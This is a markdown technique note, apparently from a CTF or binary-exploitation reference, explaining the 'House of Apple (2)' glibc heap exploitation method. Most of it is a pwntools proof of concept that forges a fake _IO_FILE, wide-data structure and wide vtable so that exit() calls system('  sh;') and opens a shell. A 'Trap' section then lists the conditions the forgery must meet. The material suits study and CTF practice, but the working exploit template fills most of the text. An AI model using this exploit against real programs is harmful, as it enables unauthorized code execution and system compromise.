# House of Apple (2)

**When**: glibc 2.34+ (no `__malloc_hook`/`__free_hook`). Need arbitrary write + trigger for `exit()` or `_IO_flush_all_lockp`.
**Primitive needed**: Large bin attack or unsorted bin attack (to write a heap address to `_IO_list_all` or `stderr`), plus controlled heap content.
**Result**: Code execution via corrupted `_IO_FILE` wide-data vtable.

## Mechanism
The `_IO_wfile_overflow` path in glibc's IO system follows `_wide_data->_wide_vtable` for function dispatch. Unlike the main vtable, the wide vtable is NOT validated by `IO_validate_vtable`. Forge a fake `_IO_FILE` whose `_wide_data` points to attacker-controlled memory with a fake wide vtable.

## PoC
```python
# IN: large bin attack primitive (writes heap addr to arbitrary location),
#     heap read/write, libc leak
# OUT: code execution on exit()
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Key offsets (adjust per libc version)
_IO_list_all = libc.sym['_IO_list_all']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

# Step 1: Use large bin attack to write heap_addr → _IO_list_all
# (See heap-primitives.md for large bin attack details)
# After this: _IO_list_all points to our controlled chunk

# Step 2: Forge fake _IO_FILE_plus at the chunk
fake_file_addr = controlled_chunk_addr
wide_data_addr = fake_file_addr + 0xe0  # place _wide_data after the FILE struct
fake_vtable_addr = wide_data_addr + 0x40

fake_file = b''
fake_file += b'  sh;'           # _flags — also serves as command string
fake_file += p64(0) * 5         # _IO_read_ptr through _IO_read_end, _IO_read_base, _IO_write_base
fake_file += p64(0)             # _IO_write_ptr
fake_file += p64(1)             # _IO_write_end (must be > _IO_write_ptr for overflow path)
fake_file += p64(0) * 4         # remaining IO fields
fake_file += p64(0)             # _chain
fake_file += p32(0)             # _fileno
fake_file += p32(0)             # _flags2
fake_file += p64(0) * 2         # _old_offset, _cur_column etc
fake_file += p64(0)             # _lock (must be writable or NULL-safe)
fake_file += p64(0) * 2
fake_file += p64(wide_data_addr)  # _wide_data → our fake wide_data
fake_file += p64(0) * 2
fake_file += p64(0)
fake_file += p64(0)
fake_file += p64(0)
fake_file += p64(_IO_wfile_jumps) # vtable → _IO_wfile_jumps (passes validation)

# Step 3: Forge fake _wide_data at wide_data_addr
fake_wide_data = b''
fake_wide_data += p64(0) * 4    # _wide_read/write pointers
fake_wide_data += p64(0)        # _IO_write_base
fake_wide_data += p64(0)        # _IO_write_ptr
fake_wide_data += p64(1)        # _IO_buf_end (must be > _IO_buf_base)
fake_wide_data += p64(0)
fake_wide_data += p64(fake_vtable_addr)  # _wide_vtable → our fake vtable

# Step 4: Forge fake wide vtable
fake_vtable = p64(0) * 13       # padding to __overflow slot
fake_vtable += p64(system)      # __overflow → system("  sh;")

# Step 5: Write everything to the controlled chunk
edit(target_idx, fake_file + fake_wide_data + fake_vtable)

# Step 6: Trigger — exit() calls _IO_flush_all_lockp → _IO_wfile_overflow
# → reads _wide_vtable → calls system("  sh;")
trigger_exit()  # or return from main, or abort

p.interactive()
```

## Trap
- `_flags` serves double duty: it's checked for IO mode bits AND its address is passed as the first argument to the vtable function. `"  sh;"` works because `system("  sh;")` invokes `/bin/sh`.
- `_IO_write_end` must be greater than `_IO_write_ptr` to enter the overflow path.
- `_lock` must point to a writable NULL qword or the IO lock operations will crash.
- The main vtable (`vtable` field) must point to a real vtable in `__libc_IO_vtables` to pass `IO_validate_vtable`. Use `_IO_wfile_jumps` — it's the one that dispatches to `_wide_vtable`.
